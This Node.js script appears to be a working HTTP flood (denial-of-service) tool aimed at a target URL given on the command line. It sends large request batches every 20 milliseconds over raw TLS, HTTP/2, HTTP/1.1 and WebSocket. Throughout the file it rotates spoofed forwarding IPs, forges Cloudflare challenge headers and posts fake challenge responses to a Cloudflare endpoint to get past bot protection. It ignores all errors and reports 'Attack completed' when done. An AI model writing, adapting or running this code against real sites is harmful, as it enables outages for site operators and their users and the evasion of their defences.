const http2 = require('http2');
const http = require('http');
const https = require('https');
const { URL } = require('url');
const tls = require('tls');
const crypto = require('crypto');
const net = require('net');
const zlib = require('zlib');

const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const cookie = process.argv[4];
const userAgent = process.argv[5];
const method = process.argv[6];

console.log(`[+] Target: ${target}`);
console.log(`[+] Duration: ${duration}s`);
console.log(`[+] Cookie: ${cookie}`);
console.log(`[+] User-Agent: ${userAgent}`);
console.log(`[+] Method: ${method}`);

const url = new URL(target);
const startTime = Date.now();
const isHttps = url.protocol === 'https:';
const host = url.hostname;
const port = url.port || (isHttps ? 443 : 80);
const path = url.pathname + url.search;

const ciphers = [
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES256-GCM-SHA384',
    'ECDHE-ECDSA-CHACHA20-POLY1305',
    'ECDHE-RSA-CHACHA20-POLY1305',
    'ECDHE-RSA-AES128-SHA256',
    'ECDHE-ECDSA-AES128-SHA256'
];

const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | 
                     crypto.constants.SSL_OP_NO_SSLv3 | 
                     crypto.constants.SSL_OP_NO_TLSv1 | 
                     crypto.constants.SSL_OP_NO_TLSv1_1;

const baseHeaders = {
    'User-Agent': userAgent,
    'Cookie': cookie,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'no-cache, no-store, must-revalidate',
    'Pragma': 'no-cache',
    'Expires': '0',
    'DNT': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'TE': 'trailers',
    'X-Forwarded-For': generateRandomIP(),
    'X-Forwarded-Proto': isHttps ? 'https' : 'http',
    'X-Real-IP': generateRandomIP()
};

function generateRandomIP() {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

function generateRandomString(length) {
    return crypto.randomBytes(length).toString('hex');
}

function createTLSSocket() {
    const socket = net.connect(port, host);
    
    const tlsSocket = tls.connect({
        socket: socket,
        host: host,
        ciphers: ciphers.join(':'),
        secureOptions: secureOptions,
        secureProtocol: 'TLSv1_2_method',
        honorCipherOrder: true,
        ecdhCurve: 'prime256v1',
        rejectUnauthorized: false,
        servername: host
    });

    tlsSocket.setKeepAlive(true);
    tlsSocket.setNoDelay(true);
    
    return tlsSocket;
}

function sendRawHTTP() {
    const tlsSocket = createTLSSocket();
    
    const request = [
        `${method} ${path} HTTP/1.1`,
        `Host: ${host}`,
        `User-Agent: ${userAgent}`,
        `Cookie: ${cookie}`,
        `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
        `Accept-Language: en-US,en;q=0.9`,
        `Accept-Encoding: gzip, deflate, br`,
        `Connection: keep-alive`,
        `Upgrade-Insecure-Requests: 1`,
        `Cache-Control: no-cache`,
        `Pragma: no-cache`,
        `X-Forwarded-For: ${generateRandomIP()}`,
        `X-Real-IP: ${generateRandomIP()}`,
        `CF-Challenge: ${generateRandomString(16)}`,
        `CF-Ray: ${generateRandomString(10)}-${generateRandomString(4)}`,
        ``,
        ``
    ].join('\r\n');

    tlsSocket.on('secureConnect', () => {
        tlsSocket.write(request);
    });

    tlsSocket.on('data', () => {});
    tlsSocket.on('error', () => {});
    
    setTimeout(() => {
        tlsSocket.destroy();
    }, 5000);
}

function sendHttp2Request() {
    try {
        const client = http2.connect(url.origin, {
            protocol: 'https:',
            rejectUnauthorized: false,
            settings: {
                enablePush: false,
                initialWindowSize: 1048576,
                maxConcurrentStreams: 1000
            },
            localAddress: generateRandomIP(),
            ciphers: ciphers.join(':'),
            secureOptions: secureOptions,
            maxVersion: 'TLSv1.3',
            minVersion: 'TLSv1.2'
        });

        client.on('error', () => {});

        const reqHeaders = {
            ':path': path,
            ':method': method,
            ':scheme': 'https',
            ':authority': host,
            ...baseHeaders,
            'x-request-id': generateRandomString(8),
            'x-cf-challenge': generateRandomString(16)
        };

        for (let i = 0; i < 5; i++) {
            const req = client.request(reqHeaders);
            
            req.on('response', () => {});
            req.on('data', () => {});
            req.on('end', () => {});
            req.on('error', () => {});

            if (method === 'POST') {
                const postData = `cf_challenge_response=${generateRandomString(32)}&timestamp=${Date.now()}`;
                req.write(postData);
            }
            
            req.end();
        }

        setTimeout(() => {
            try {
                client.close();
            } catch (e) {}
        }, 1000);
    } catch (e) {}
}

function sendHttp1Request() {
    const options = {
        hostname: host,
        port: port,
        path: path,
        method: method,
        headers: {
            'Host': host,
            ...baseHeaders,
            'X-Request-ID': generateRandomString(8)
        },
        rejectUnauthorized: false,
        agent: false,
        timeout: 5000
    };

    if (isHttps) {
        options.secureProtocol = 'TLSv1_2_method';
        options.ciphers = ciphers.join(':');
        options.secureOptions = secureOptions;
        options.honorCipherOrder = true;
    }

    const proto = isHttps ? https : http;
    
    for (let i = 0; i < 10; i++) {
        const req = proto.request(options, (res) => {
            res.on('data', () => {});
            res.on('end', () => {});
        });

        req.on('error', () => {});
        req.on('timeout', () => req.destroy());

        if (method === 'POST') {
            const postData = `cf_clearance=${cookie.split('=')[1]}&challenge=${generateRandomString(16)}`;
            req.setHeader('Content-Type', 'application/x-www-form-urlencoded');
            req.setHeader('Content-Length', Buffer.byteLength(postData));
            req.write(postData);
        }
        
        req.end();
    }
}

function sendWebSocketRequest() {
    try {
        const WebSocket = require('ws');
        const wsUrl = `wss://${host}${path}`;
        const ws = new WebSocket(wsUrl, {
            headers: {
                'User-Agent': userAgent,
                'Cookie': cookie,
                'Origin': `https://${host}`
            },
            rejectUnauthorized: false
        });

        ws.on('open', () => {
            ws.send(JSON.stringify({
                type: 'challenge',
                response: generateRandomString(32),
                timestamp: Date.now()
            }));
            
            setTimeout(() => ws.close(), 1000);
        });

        ws.on('error', () => {});
        ws.on('message', () => {});
    } catch (e) {}
}

function sendChallengeResponse() {
    const challengeData = {
        cf_challenge: generateRandomString(32),
        cf_clearance: cookie,
        user_agent: userAgent,
        timestamp: Date.now(),
        fingerprint: {
            screen: '1920x1080',
            timezone: 'Asia/Jakarta',
            language: 'en-US',
            platform: 'Win32',
            cores: navigator?.hardwareConcurrency || 8,
            memory: 8
        }
    };

    const options = {
        hostname: host,
        port: port,
        path: '/cdn-cgi/challenge-platform/h/b/feedback',
        method: 'POST',
        headers: {
            'Host': host,
            'User-Agent': userAgent,
            'Cookie': cookie,
            'Content-Type': 'application/json',
            ...baseHeaders
        },
        rejectUnauthorized: false
    };

    const proto = isHttps ? https : http;
    const req = proto.request(options);
    
    req.on('error', () => {});
    req.write(JSON.stringify(challengeData));
    req.end();
}

function sendRequest() {
    const rand = Math.random();
    
    if (rand < 0.3) {
        sendRawHTTP();
    } else if (rand < 0.6) {
        sendHttp2Request();
    } else if (rand < 0.8) {
        sendHttp1Request();
    } else {
        try {
            sendWebSocketRequest();
        } catch (e) {
            sendHttp1Request();
        }
    }
    
    if (rand < 0.2) {
        setTimeout(sendChallengeResponse, Math.random() * 100);
    }
}

const interval = setInterval(() => {
    if (Date.now() - startTime >= duration * 1000) {
        clearInterval(interval);
        console.log(`[+] Attack completed`);
        process.exit(0);
    }
    
    const batchSize = Math.floor(Math.random() * 200) + 100;
    
    for (let i = 0; i < batchSize; i++) {
        setTimeout(sendRequest, Math.random() * 10);
    }
}, 20);

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

setTimeout(() => {
    sendChallengeResponse();
}, 1000);
